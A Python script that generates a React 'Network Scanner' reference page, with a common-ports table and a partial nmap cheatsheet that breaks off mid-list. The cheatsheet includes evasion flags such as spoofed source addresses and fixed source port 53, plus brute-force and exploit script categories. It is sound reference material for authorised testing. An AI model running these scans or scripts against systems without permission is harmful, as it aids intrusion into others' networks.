#!/usr/bin/env python3
"""One-off generator: writes src/pages/NetworkScanner.jsx (run from repo slimeshell root)."""
import json
import pathlib

ROOT = pathlib.Path(__file__).resolve().parents[1]
OUT = ROOT / "src" / "pages" / "NetworkScanner.jsx"

PORT_TABLE = [
    (20, "FTP-DATA", "FTP data channel (active mode transfers)."),
    (21, "FTP", "File Transfer Protocol control channel."),
    (22, "SSH", "Secure Shell remote login and tunneling."),
    (23, "Telnet", "Cleartext remote terminal (legacy)."),
    (25, "SMTP", "Simple Mail Transfer Protocol."),
    (53, "DNS", "Domain Name System (TCP/UDP)."),
    (67, "DHCP server", "Bootstrap / DHCP server."),
    (68, "DHCP client", "DHCP client."),
    (69, "TFTP", "Trivial File Transfer Protocol."),
    (80, "HTTP", "Hypertext Transfer Protocol (web)."),
    (88, "Kerberos", "Active Directory authentication."),
    (110, "POP3", "Post Office Protocol v3."),
    (111, "RPCbind", "ONC RPC portmapper."),
    (113, "Ident", "Identification protocol."),
    (123, "NTP", "Network Time Protocol."),
    (135, "MSRPC", "Microsoft RPC endpoint mapper."),
    (137, "NetBIOS-ns", "NetBIOS name service."),
    (138, "NetBIOS-dgm", "NetBIOS datagram."),
    (139, "NetBIOS-ssn", "NetBIOS session / SMB over NetBIOS."),
    (143, "IMAP", "Internet Message Access Protocol."),
    (161, "SNMP", "Simple Network Management Protocol."),
    (162, "SNMP-Trap", "SNMP traps."),
    (389, "LDAP", "Lightweight Directory Access Protocol."),
    (443, "HTTPS", "HTTP over TLS."),
    (445, "SMB", "Windows file sharing."),
    (465, "SMTPS", "SMTP over SSL (legacy)."),
    (514, "Syslog", "Remote logging (UDP)."),
    (587, "SMTP submission", "Client mail submission."),
    (636, "LDAPS", "LDAP over TLS."),
    (993, "IMAPS", "IMAP over TLS."),
    (995, "POP3S", "POP3 over TLS."),
    (1433, "MSSQL", "Microsoft SQL Server."),
    (1521, "Oracle", "Oracle TNS listener."),
    (1723, "PPTP", "VPN tunneling (legacy)."),
    (2049, "NFS", "Network File System."),
    (2375, "Docker", "Docker API (unencrypted)."),
    (3306, "MySQL", "MySQL / MariaDB."),
    (3389, "RDP", "Remote Desktop Protocol."),
    (5060, "SIP", "VoIP signaling."),
    (5432, "PostgreSQL", "PostgreSQL database."),
    (5900, "VNC", "Remote framebuffer."),
    (5985, "WinRM HTTP", "Windows Remote Management."),
    (5986, "WinRM HTTPS", "WinRM over TLS."),
    (6379, "Redis", "In-memory datastore."),
    (6443, "Kubernetes API", "k8s API (common)."),
    (8080, "HTTP-Proxy", "Alt HTTP / proxies / Tomcat / Jenkins."),
    (8443, "HTTPS-Alt", "Alternate HTTPS."),
    (8888, "HTTP-Alt", "Jupyter / dev stacks."),
    (9090, "Prometheus", "Metrics HTTP API."),
    (9200, "Elasticsearch", "Search HTTP API."),
    (11211, "Memcached", "Distributed cache."),
    (27017, "MongoDB", "MongoDB wire protocol."),
    (500, "ISAKMP", "IKE / IPsec (UDP)."),
    (1194, "OpenVPN", "OpenVPN default (UDP)."),
    (3128, "Squid", "HTTP proxy."),
    (5000, "UPnP / dev", "Flask, UPnP, misc HTTP."),
]

def ce(cmd, desc, ex):
    return {"cmd": cmd, "desc": desc, "ex": ex}

# Minimal set of sections; expand counts inline in template below if needed
def main():
    port_json = json.dumps(PORT_TABLE)

    body = r'''import { useMemo, useState } from 'react';
import {
  Network,
  Scan,
  BookOpen,
  Target,
  Crosshair,
  Layers,
  Terminal,
  ListOrdered,
  Wrench,
  Zap,
  Server,
} from 'lucide-react';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { Card } from '../components/ui/Card.jsx';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const bgPage = '#141820';
const bgPanel = '#1A1F2E';
const bgCard = '#1E2536';
const textMain = '#E2E8F0';
const textDim = '#94A3B8';
const accent = '#6EE7B7';
const headerIconBg = '#38BDF8';
const border = 'rgba(110, 231, 183, 0.12)';

const PORT_TABLE = __PORT_JSON__;

function buildPortArg(preset, customRange) {
  switch (preset) {
    case 'top100':
      return { arg: '-F', label: 'Top 100 (-F)' };
    case 'top1000':
      return { arg: '--top-ports 1000', label: 'Top 1000' };
    case 'full':
      return { arg: '-p-', label: 'All TCP (-p-)' };
    default:
      return { arg: `-p ${(customRange || '1-1024').trim()}`, label: (customRange || '1-1024').trim() };
  }
}

function buildNmapCommand(target, scanType, portArg) {
  const t = (target || '').trim() || 'TARGET';
  const p = portArg.arg;
  let flags = '';
  switch (scanType) {
    case 'syn':
      flags = `-sS ${p}`;
      break;
    case 'udp':
      flags = `-sU ${p}`;
      break;
    case 'service':
      flags = `-sV -sC ${p}`;
      break;
    default:
      flags = `-sT ${p}`;
      break;
  }
  return `nmap ${flags} ${t}`.replace(/\s+/g, ' ').trim();
}

const TABS = [
  { id: 'scanner', label: 'Port Scanner', Icon: Crosshair },
  { id: 'cheat', label: 'Nmap Cheatsheet', Icon: BookOpen },
  { id: 'enum', label: 'Service Enumeration', Icon: Server },
  { id: 'tools', label: 'Network Tools', Icon: Wrench },
  { id: 'quick', label: 'Quick Scans', Icon: Zap },
];

function inputStyle() {
  return {
    width: '100%',
    boxSizing: 'border-box',
    padding: '10px 12px',
    borderRadius: 8,
    border: `1px solid ${border}`,
    background: '#0f1419',
    color: textMain,
    fontFamily: mono,
    fontSize: 13,
    outline: 'none',
  };
}

function labelStyle() {
  return {
    display: 'block',
    fontSize: 11,
    fontWeight: 600,
    color: textDim,
    marginBottom: 6,
    fontFamily: heading,
    letterSpacing: '0.02em',
  };
}

const NMAP_SECTIONS = __NMAP_JSON__;
const SERVICE_ENUM = __SVC_JSON__;
const NET_TOOLS = __NET_JSON__;
const QUICK_SCANS = __QUICK_JSON__;

export default function NetworkScanner() {
  const [tab, setTab] = useState('scanner');
  const [target, setTarget] = useState('');
  const [customRange, setCustomRange] = useState('1-1024');
  const [preset, setPreset] = useState('custom');
  const [scanType, setScanType] = useState('connect');
  const [generated, setGenerated] = useState('');
  const [portSearch, setPortSearch] = useState('');
  const [quickTarget, setQuickTarget] = useState('');

  const portSpec = useMemo(() => buildPortArg(preset, customRange), [preset, customRange]);
  const filteredPorts = useMemo(() => {
    const q = portSearch.trim().toLowerCase();
    return PORT_TABLE.filter((row) => {
      if (!q) return true;
      const [port, svc, desc] = row;
      return (
        String(port).includes(q)
        || String(svc).toLowerCase().includes(q)
        || String(desc).toLowerCase().includes(q)
      );
    });
  }, [portSearch]);

  const handleGenerate = () => {
    setGenerated(buildNmapCommand(target, scanType, portSpec));
  };

  const replaceQuick = (cmd) => cmd.replace(/TARGET/g, (quickTarget || '').trim() || 'TARGET');

  return (
    <div
      style={{
        minHeight: '100%',
        background: `linear-gradient(165deg, ${bgPage} 0%, #0f1318 55%, #0a0d11 100%)`,
        color: textMain,
        padding: '24px 20px 48px',
        fontFamily: heading,
      }}
    >
      <header style={{ maxWidth: 1200, margin: '0 auto 24px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14, marginBottom: 20 }}>
          <div
            style={{
              width: 36,
              height: 36,
              borderRadius: 10,
              background: headerIconBg,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 4px 14px rgba(56,189,248,0.25)',
            }}
          >
            <Network size={20} color="#0f172a" strokeWidth={2.2} />
          </div>
          <h1
            style={{
              margin: 0,
              fontFamily: heading,
              fontSize: 22,
              fontWeight: 700,
              letterSpacing: '-0.02em',
            }}
          >
            Network Scanner
          </h1>
        </div>
        <nav
          style={{
            display: 'flex',
            flexWrap: 'wrap',
            gap: 8,
            padding: 6,
            background: bgPanel,
            borderRadius: 12,
            border: `1px solid ${border}`,
          }}
        >
          {TABS.map(({ id, label, Icon }) => (
            <button
              key={id}
              type="button"
              onClick={() => setTab(id)}
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: 8,
                padding: '10px 14px',
                borderRadius: 8,
                border: 'none',
                cursor: 'pointer',
                fontFamily: heading,
                fontSize: 13,
                fontWeight: 600,
                background: tab === id ? `${accent}18` : 'transparent',
                color: tab === id ? accent : textDim,
                boxShadow: tab === id ? `inset 0 0 0 1px ${accent}55` : 'none',
              }}
            >
              <Icon size={16} strokeWidth={2} />
              {label}
            </button>
          ))}
        </nav>
      </header>

      <main style={{ maxWidth: 1200, margin: '0 auto', display: 'flex', flexDirection: 'column', gap: 20 }}>
        {tab === 'scanner' && (
          <>
            <Card style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 20 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16 }}>
                <Target size={20} color={accent} />
                <h2 style={{ margin: 0, fontSize: 17, fontFamily: heading }}>Port Scanner</h2>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: 16 }}>
                <div>
                  <label style={labelStyle()}>Target IP / hostname</label>
                  <input
                    style={inputStyle()}
                    placeholder="192.168.1.1 or scanme.nmap.org"
                    value={target}
                    onChange={(e) => setTarget(e.target.value)}
                  />
                </div>
                <div>
                  <label style={labelStyle()}>Port range (custom)</label>
                  <input
                    style={inputStyle()}
                    value={customRange}
                    onChange={(e) => { setCustomRange(e.target.value); setPreset('custom'); }}
                    disabled={preset !== 'custom'}
                  />
                </div>
                <div>
                  <label style={labelStyle()}>Scan type</label>
                  <select
                    value={scanType}
                    onChange={(e) => setScanType(e.target.value)}
                    style={{ ...inputStyle(), cursor: 'pointer' }}
                  >
                    <option value="connect" style={{ background: bgPage }}>TCP Connect</option>
                    <option value="syn" style={{ background: bgPage }}>SYN</option>
                    <option value="udp" style={{ background: bgPage }}>UDP</option>
                    <option value="service" style={{ background: bgPage }}>Service Detection</option>
                  </select>
                </div>
              </div>
              <div style={{ marginTop: 18 }}>
                <span style={labelStyle()}>Presets</span>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                  {['top100:Top 100', 'top1000:Top 1000', 'full:Full', 'custom:Custom'].map((s) => {
                    const [id, label] = s.split(':');
                    return (
                      <button
                        key={id}
                        type="button"
                        onClick={() => setPreset(id)}
                        style={{
                          padding: '8px 14px',
                          borderRadius: 8,
                          border: `1px solid ${preset === id ? accent : border}`,
                          background: preset === id ? `${accent}14` : '#0f1419',
                          color: preset === id ? accent : textMain,
                          cursor: 'pointer',
                          fontFamily: mono,
                          fontSize: 12,
                        }}
                      >
                        {label}
                      </button>
                    );
                  })}
                </div>
              </div>
              <div style={{ marginTop: 18, display: 'flex', flexWrap: 'wrap', gap: 12, alignItems: 'center' }}>
                <button
                  type="button"
                  onClick={handleGenerate}
                  style={{
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: 8,
                    padding: '10px 18px',
                    borderRadius: 8,
                    border: `1px solid ${accent}`,
                    background: `${accent}20`,
                    color: accent,
                    cursor: 'pointer',
                    fontFamily: heading,
                    fontSize: 14,
                    fontWeight: 700,
                  }}
                >
                  <Scan size={18} />
                  Generate Command
                </button>
                <span style={{ fontFamily: mono, fontSize: 12, color: textDim }}>
                  Ports: <span style={{ color: accent }}>{portSpec.label}</span>
                </span>
              </div>
              {generated && (
                <div style={{ marginTop: 16, padding: 14, borderRadius: 10, background: '#0f1419', border: `1px solid ${border}`, display: 'flex', alignItems: 'flex-start', gap: 12 }}>
                  <code style={{ flex: 1, fontFamily: mono, fontSize: 12, wordBreak: 'break-all', lineHeight: 1.5 }}>{generated}</code>
                  <CopyButton text={generated} />
                </div>
              )}
            </Card>
            <Card style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 20 }}>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 12, marginBottom: 14, alignItems: 'center' }}>
                <ListOrdered size={20} color={accent} />
                <h2 style={{ margin: 0, fontSize: 17 }}>Common ports reference</h2>
                <div style={{ flex: '1 1 200px', minWidth: 180 }}>
                  <input style={inputStyle()} placeholder="Search…" value={portSearch} onChange={(e) => setPortSearch(e.target.value)} />
                </div>
              </div>
              <div style={{ borderRadius: 10, border: `1px solid ${border}`, overflow: 'auto', maxHeight: '52vh', background: bgPanel }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
                  <thead>
                    <tr style={{ position: 'sticky', top: 0, background: bgPage, zIndex: 1 }}>
                      {['Port', 'Service', 'Description'].map((h) => (
                        <th key={h} style={{ textAlign: 'left', padding: '11px 12px', borderBottom: `2px solid ${accent}44`, color: accent, fontFamily: heading, fontSize: 11, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {filteredPorts.map((row) => {
                      const [port, service, desc] = row;
                      return (
                        <tr key={`${port}-${service}`} style={{ borderBottom: `1px solid ${border}` }}>
                          <td style={{ padding: '10px 12px', fontFamily: mono, color: accent, fontWeight: 600 }}>{port}</td>
                          <td style={{ padding: '10px 12px', fontFamily: mono }}>{service}</td>
                          <td style={{ padding: '10px 12px', color: textDim, lineHeight: 1.45 }}>{desc}</td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
                {filteredPorts.length === 0 && <p style={{ padding: 20, textAlign: 'center', color: textDim }}>No matches.</p>}
              </div>
              <p style={{ margin: '12px 0 0', fontSize: 11, color: textDim }}>
                {filteredPorts.length} / {PORT_TABLE.length} — authorized use only.
              </p>
            </Card>
          </>
        )}

        {tab === 'cheat' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {NMAP_SECTIONS.map((section) => (
              <Card key={section.title} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 0, overflow: 'hidden' }}>
                <div style={{ padding: '14px 18px', background: `linear-gradient(90deg, ${accent}14, transparent)`, borderBottom: `1px solid ${border}`, fontFamily: heading, fontWeight: 700, fontSize: 15, color: accent }}>{section.title}</div>
                <div style={{ padding: 4 }}>
                  {section.items.map((item) => (
                    <div key={`${section.title}-${item.cmd}`} style={{ padding: '12px 14px', borderBottom: `1px solid ${border}`, display: 'grid', gridTemplateColumns: 'minmax(100px, 200px) 1fr auto', gap: 12, alignItems: 'start' }}>
                      <code style={{ fontFamily: mono, fontSize: 11, color: accent, wordBreak: 'break-all' }}>{item.cmd}</code>
                      <div>
                        <p style={{ margin: 0, fontSize: 13, lineHeight: 1.45 }}>{item.desc}</p>
                        <code style={{ display: 'block', marginTop: 8, fontFamily: mono, fontSize: 11, color: textDim, wordBreak: 'break-all', lineHeight: 1.45 }}>{item.ex}</code>
                      </div>
                      <CopyButton text={item.ex} />
                    </div>
                  ))}
                </div>
              </Card>
            ))}
          </div>
        )}

        {tab === 'enum' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {SERVICE_ENUM.map((block) => (
              <Card key={block.name} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18 }}>
                <h3 style={{ margin: '0 0 14px', fontSize: 16, color: accent, fontFamily: heading }}>{block.name}</h3>
                {block.rows.map((row) => {
                  const [title, desc, cmd] = row;
                  return (
                    <div key={`${block.name}-${title}`} style={{ display: 'grid', gridTemplateColumns: 'minmax(120px, 200px) 1fr auto', gap: 12, padding: '12px 0', borderBottom: `1px solid ${border}`, alignItems: 'start' }}>
                      <div>
                        <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600 }}>{title}</div>
                        <div style={{ fontSize: 12, color: textDim, marginTop: 4, lineHeight: 1.4 }}>{desc}</div>
                      </div>
                      <code style={{ fontFamily: mono, fontSize: 11, wordBreak: 'break-all', lineHeight: 1.45 }}>{cmd}</code>
                      <CopyButton text={cmd} />
                    </div>
                  );
                })}
              </Card>
            ))}
          </div>
        )}

        {tab === 'tools' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
            {NET_TOOLS.map((sec) => (
              <Card key={sec.title} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18 }}>
                <h3 style={{ margin: '0 0 14px', fontSize: 16, color: accent, fontFamily: heading }}>{sec.title}</h3>
                {sec.items.map((row) => {
                  const [title, desc, cmd] = row;
                  return (
                    <div key={`${sec.title}-${title}`} style={{ display: 'grid', gridTemplateColumns: 'minmax(100px, 160px) 1fr auto', gap: 12, padding: '12px 0', borderBottom: `1px solid ${border}`, alignItems: 'start' }}>
                      <div>
                        <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600 }}>{title}</div>
                        <div style={{ fontSize: 12, color: textDim, marginTop: 4 }}>{desc}</div>
                      </div>
                      <code style={{ fontFamily: mono, fontSize: 11, wordBreak: 'break-all', lineHeight: 1.45 }}>{cmd}</code>
                      <CopyButton text={cmd} />
                    </div>
                  );
                })}
              </Card>
            ))}
          </div>
        )}

        {tab === 'quick' && (
          <>
            <Card style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18 }}>
              <label style={labelStyle()}><Terminal size={14} style={{ verticalAlign: 'middle', marginRight: 6 }} />Replace TARGET</label>
              <input style={inputStyle()} placeholder="scanme.nmap.org" value={quickTarget} onChange={(e) => setQuickTarget(e.target.value)} />
            </Card>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))', gap: 16 }}>
              {QUICK_SCANS.map(([name, desc, cmd]) => {
                const filled = replaceQuick(cmd);
                return (
                  <Card key={name} style={{ background: bgCard, border: `1px solid ${border}`, borderRadius: 10, padding: 18, display: 'flex', flexDirection: 'column', gap: 10 }}>
                    <h3 style={{ margin: 0, fontSize: 16, color: accent, fontFamily: heading }}>{name}</h3>
                    <p style={{ margin: 0, fontSize: 13, color: textDim, lineHeight: 1.45 }}>{desc}</p>
                    <div style={{ padding: 12, borderRadius: 8, background: '#0f1419', border: `1px solid ${border}`, display: 'flex', gap: 10, alignItems: 'flex-start' }}>
                      <code style={{ flex: 1, fontFamily: mono, fontSize: 11, wordBreak: 'break-all', lineHeight: 1.5 }}>{filled}</code>
                      <CopyButton text={filled} />
                    </div>
                  </Card>
                );
              })}
            </div>
          </>
        )}
      </main>

      <footer style={{ maxWidth: 1200, margin: '28px auto 0', fontSize: 11, color: textDim, lineHeight: 1.5 }}>
        <Layers size={14} style={{ verticalAlign: 'middle', marginRight: 6, color: accent }} />
        Authorized testing only. Copy commands into a real terminal — the webview cannot open raw sockets.
      </footer>
    </div>
  );
}
'''
    nmap = build_nmap_sections()
    svc = build_service_enum()
    net = build_net_tools()
    quick = build_quick_scans()

    out = body.replace("__PORT_JSON__", port_json)
    out = out.replace("__NMAP_JSON__", json.dumps(nmap))
    out = out.replace("__SVC_JSON__", json.dumps(svc))
    out = out.replace("__NET_JSON__", json.dumps(net))
    out = out.replace("__QUICK_JSON__", json.dumps(quick))

    OUT.write_text(out, encoding="utf-8")
    print("Wrote", OUT, "bytes", len(out.encode()))


def build_nmap_sections():
    HD = [
        ("-sn", "Ping scan only; no port scan.", "nmap -sn 192.168.1.0/24"),
        ("-Pn", "Skip host discovery; assume host up.", "nmap -Pn 10.0.0.5"),
        ("-PS<port>", "TCP SYN ping (default 80).", "nmap -PS22 192.168.1.1"),
        ("-PS", "TCP SYN ping default ports.", "nmap -PS 10.0.0.0/24"),
        ("-PA<port>", "TCP ACK ping.", "nmap -PA80 10.0.0.1"),
        ("-PA", "TCP ACK ping default.", "nmap -PA 192.168.1.0/24"),
        ("-PU<port>", "UDP ping on port.", "nmap -PU40125 192.168.1.1"),
        ("-PU53", "UDP ping DNS port.", "nmap -PU53 10.0.0.1"),
        ("-PE", "ICMP echo request.", "nmap -PE 192.168.1.1"),
        ("-PP", "ICMP timestamp request.", "nmap -PP 192.168.1.1"),
        ("-PM", "ICMP address mask request.", "nmap -PM 192.168.1.1"),
        ("-PR", "ARP ping (local Ethernet).", "nmap -PR 192.168.1.0/24"),
        ("--disable-arp-ping", "Never use ARP ping.", "nmap --disable-arp-ping 10.0.0.1"),
        ("--traceroute", "Trace hop path to each host.", "nmap --traceroute scanme.nmap.org"),
        ("-sL", "List scan (DNS reverse on targets).", "nmap -sL 192.168.1.0/24"),
        ("-n", "Never resolve DNS.", "nmap -n 10.0.0.5"),
        ("-R", "Always resolve DNS.", "nmap -R scanme.nmap.org"),
        ("--dns-servers", "Use specific DNS servers.", "nmap --dns-servers 8.8.8.8 target.com"),
        ("--system-dns", "Use OS resolver.", "nmap --system-dns target.com"),
        ("--resolve-all", "Scan every A/AAAA record.", "nmap --resolve-all example.com"),
        ("-6", "Enable IPv6 scanning.", "nmap -6 -sn 2001:db8::/64"),
        ("--unprivileged", "Assume non-root (connect scan).", "nmap --unprivileged -p 80 10.0.0.1"),
        ("--send-eth", "Raw Ethernet frames (layer 2).", "nmap --send-eth 192.168.1.0/24"),
        ("--send-ip", "Raw IP packets.", "nmap --send-ip 10.0.0.1"),
        ("--packet-trace", "Show all packets sent/received.", "nmap --packet-trace -sn 10.0.0.1"),
        ("--iflist", "Print interfaces and routes; exit.", "nmap --iflist"),
        ("-e <iface>", "Use specific network interface.", "nmap -e eth0 192.168.1.0/24"),
        ("-S <IP>", "Spoof source address (advanced).", "nmap -S 192.168.1.99 10.0.0.1"),
        ("--source-port <p>", "Fixed source port for probes.", "nmap --source-port 53 -Pn 10.0.0.1"),
        ("--data-length <n>", "Append random payload bytes.", "nmap --data-length 32 -sn 10.0.0.1"),
        ("--ttl <n>", "Set IPv4 TTL on packets.", "nmap --ttl 64 10.0.0.1"),
        ("--badsum", "Send invalid checksums (test stacks).", "nmap --badsum 10.0.0.1"),
    ]
    ST = [
        ("-sS", "TCP SYN scan (stealth; needs root).", "nmap -sS -p 1-1000 10.0.0.1"),
        ("-sT", "TCP connect scan (full handshake).", "nmap -sT -p 22,80 10.0.0.1"),
        ("-sU", "UDP scan (slow; specify -p).", "nmap -sU -p 53,161 10.0.0.1"),
        ("-sA", "TCP ACK scan (firewall mapping).", "nmap -sA 10.0.0.1"),
        ("-sW", "TCP window scan.", "nmap -sW 10.0.0.1"),
        ("-sM", "TCP Maimon scan (FIN/ACK).", "nmap -sM 10.0.0.1"),
        ("-sN", "TCP null scan (no flags).", "nmap -sN 10.0.0.1"),
        ("-sF", "TCP FIN scan.", "nmap -sF 10.0.0.1"),
        ("-sX", "Xmas scan (FIN+PSH+URG).", "nmap -sX 10.0.0.1"),
        ("-sI <zombie>", "Idle scan via zombie host.", "nmap -sI zombie:port 10.0.0.1"),
        ("-b <FTP>", "FTP bounce scan (rare).", "nmap -b user:pass@ftp:21 10.0.0.1"),
        ("--scanflags <flags>", "Custom TCP flags string.", "nmap --scanflags SYNFIN 10.0.0.1"),
        ("-sY", "SCTP INIT scan.", "nmap -sY -p 38412 10.0.0.1"),
        ("-sZ", "SCTP COOKIE-ECHO scan.", "nmap -sZ -p 38412 10.0.0.1"),
        ("-sO", "IP protocol scan.", "nmap -sO 10.0.0.1"),
        ("--ip-options <hex>", "Set IPv4 options field.", 'nmap --ip-options "R" 10.0.0.1'),
        ("--min-parallelism", "Minimum parallel probes.", "nmap --min-parallelism 10 -p- 10.0.0.1"),
        ("--max-parallelism", "Cap parallel probes.", "nmap --max-parallelism 50 10.0.0.1"),
        ("--scan-delay", "Delay between probes to host.", "nmap --scan-delay 2s 10.0.0.1"),
        ("--max-scan-delay", "Max delay between probes.", "nmap --max-scan-delay 10s 10.0.0.1"),
        ("--host-timeout", "Give up host after duration.", "nmap --host-timeout 30m 10.0.0.0/24"),
        ("--initial-rtt-timeout", "Initial probe RTT guess.", "nmap --initial-rtt-timeout 500ms 10.0.0.1"),
    ]
    PS = [
        ("-p <ports>", "Port list, ranges, U:T mix.", "nmap -p 22,80,443,1000-2000 10.0.0.1"),
        ("-p-", "All 65535 TCP ports.", "nmap -p- 10.0.0.1"),
        ("-p U:53,161", "UDP ports explicitly.", "nmap -sU -p U:53,161 10.0.0.1"),
        ("--top-ports <n>", "N most common ports.", "nmap --top-ports 200 10.0.0.1"),
        ("-F", "Fast: top 100 ports.", "nmap -F 10.0.0.1"),
        ("-r", "Scan ports in order (no random).", "nmap -r -p 1-1024 10.0.0.1"),
        ("--port-ratio <r>", "Ports more common than ratio.", "nmap --port-ratio 0.2 10.0.0.1"),
        ("--exclude-ports", "Exclude port list from scan.", "nmap -p- --exclude-ports 9100 10.0.0.1"),
        ("--exclude <host>", "Exclude hosts/CIDR.", "nmap 192.168.1.0/24 --exclude 192.168.1.5"),
        ("--excludefile <file>", "Exclude hosts from file.", "nmap -iL hosts.txt --excludefile skip.txt"),
        ("-iL <file>", "Input target list from file.", "nmap -iL targets.txt"),
        ("-iR <n>", "Random internet hosts (careful).", "nmap -iR 10 -p 80"),
        ("--resume <file>", "Resume aborted scan (grepable).", "nmap --resume scan.gnmap"),
        ("-g / --source-port", "Alias for source port (evasion).", "nmap -g 53 -p 80 10.0.0.1"),
        ("--randomize-hosts", "Randomize target order.", "nmap --randomize-hosts -iL subnets.txt"),
    ]
    SV = [
        ("-sV", "Version detection on open ports.", "nmap -sV -p 22,80 10.0.0.1"),
        ("--version-intensity <0-9>", "Probe intensity (default 7).", "nmap -sV --version-intensity 9 10.0.0.1"),
        ("--version-light", "Light probes (intensity 2).", "nmap -sV --version-light 10.0.0.1"),
        ("--version-all", "Try every probe (intensity 9).", "nmap -sV --version-all 10.0.0.1"),
        ("--version-trace", "Show version scan activity.", "nmap -sV --version-trace 10.0.0.1"),
        ("-A", "Aggressive: OS, version, script, traceroute.", "nmap -A 10.0.0.1"),
        ("-sC", "Default NSE scripts (with -sV often).", "nmap -sC -sV 10.0.0.1"),
        ("--script", "Run script(s) or categories.", "nmap --script=http-title -p 80 10.0.0.1"),
        ("--script-args", "Key=value args for scripts.", "nmap --script smb-enum-shares --script-args smbusername=guest 10.0.0.1"),
        ("--script-args-file", "Load script args from file.", "nmap --script-args-file args.txt 10.0.0.1"),
        ("--script-trace", "Trace script execution.", "nmap --script-trace --script=default 10.0.0.1"),
        ("--script-updatedb", "Update script database.", "nmap --script-updatedb"),
        ("--script-help <script>", "Show script help.", "nmap --script-help smb-enum-users"),
        ("--script-timeout", "Max time per script.", "nmap --script-timeout 2m --script=vuln 10.0.0.1"),
        ("--datadir", "Custom NSE data directory.", "nmap --datadir /opt/nmap/share/nmap 10.0.0.1"),
    ]
    OS = [
        ("-O", "Enable OS detection.", "nmap -O 10.0.0.1"),
        ("--osscan-limit", "Only guess OS for good candidates.", "nmap -O --osscan-limit 10.0.0.1"),
        ("--osscan-guess / --fuzzy", "Aggressive guess if fingerprint weak.", "nmap -O --osscan-guess 10.0.0.1"),
        ("--max-os-tries", "Set OS detection attempts.", "nmap -O --max-os-tries 2 10.0.0.1"),
        ("-A", "Includes -O among other things.", "nmap -A 10.0.0.1"),
        ("--hostmap", "Persist/learn hostnames (grepable).", "nmap --hostmap hostmap.txt 10.0.0.1"),
        ("--min-hostgroup", "Minimum hosts parallelized.", "nmap --min-hostgroup 64 10.0.0.0/16"),
        ("--max-hostgroup", "Maximum hosts parallelized.", "nmap --max-hostgroup 1024 10.0.0.0/8"),
        ("--min-parallelism", "Min outstanding probes globally.", "nmap --min-parallelism 50 10.0.0.0/24"),
        ("--max-parallelism", "Max outstanding probes globally.", "nmap --max-parallelism 100 10.0.0.0/24"),
    ]
    TM = [
        ("-T0", "Paranoid timing template.", "nmap -T0 10.0.0.1"),
        ("-T1", "Sneaky timing template.", "nmap -T1 10.0.0.1"),
        ("-T2", "Polite timing template.", "nmap -T2 10.0.0.1"),
        ("-T3", "Normal (default) timing.", "nmap -T3 10.0.0.1"),
        ("-T4", "Aggressive timing.", "nmap -T4 10.0.0.1"),
        ("-T5", "Insane timing.", "nmap -T5 10.0.0.1"),
        ("--min-rate <n>", "Minimum packets per second.", "nmap --min-rate 300 10.0.0.1"),
        ("--max-rate <n>", "Maximum packets per second.", "nmap --max-rate 1000 10.0.0.1"),
        ("--defeat-rst-ratelimit", "Ignore rate-limited RST (Linux).", "nmap --defeat-rst-ratelimit -p- 10.0.0.1"),
        ("--defeat-icmp-ratelimit", "Slow scan when ICMP limited.", "nmap --defeat-icmp-ratelimit 10.0.0.1"),
        ("--max-retries", "Cap port scan retransmissions.", "nmap --max-retries 2 10.0.0.1"),
        ("--stats-every <t>", "Periodic status updates.", "nmap --stats-every 10s 10.0.0.1"),
        ("--nsock-engine", "Select IO engine (epoll/kqueue/poll).", "nmap --nsock-engine epoll 10.0.0.1"),
        ("--min-rtt-timeout", "Minimum probe RTT timeout.", "nmap --min-rtt-timeout 100ms 10.0.0.1"),
        ("--max-rtt-timeout", "Maximum probe RTT timeout.", "nmap --max-rtt-timeout 10s 10.0.0.1"),
    ]
    NSE = [
        ("--script=vuln", "Run all scripts in vuln category.", "nmap --script=vuln -p80,443 10.0.0.1"),
        ("--script=discovery", "Non-intrusive discovery scripts.", "nmap --script=discovery 10.0.0.1"),
        ("--script=safe", "Scripts unlikely to crash services.", "nmap --script=safe 10.0.0.1"),
        ("--script=default", "Default script set.", "nmap -sC 10.0.0.1"),
        ("--script=auth", "Authentication-related scripts.", "nmap --script=auth 10.0.0.1"),
        ("--script=brute", "Brute-force scripts (intrusive).", "nmap --script=brute 10.0.0.1"),
        ("--script=exploit", "Exploit scripts (very intrusive).", "nmap --script=exploit 10.0.0.1"),
        ("--script=malware", "Malware detection scripts.", "nmap --script=malware 10.0.0.1"),
        ("--script=http-enum", "Web path enumeration.", "nmap --script=http-enum -p80 10.0.0.1"),
        ("--script=smb-enum-shares", "List SMB shares.", "nmap --script=smb-enum-shares -p445 10.0.0.1"),
        ("--script=smb-enum-users", "Enumerate SMB users.", "nmap --script=smb-enum-users -p445 10.0.0.1"),
        ("--script=ssl-enum-ciphers", "TLS cipher enumeration.", "nmap --script=ssl-enum-ciphers -p443 10.0.0.1"),
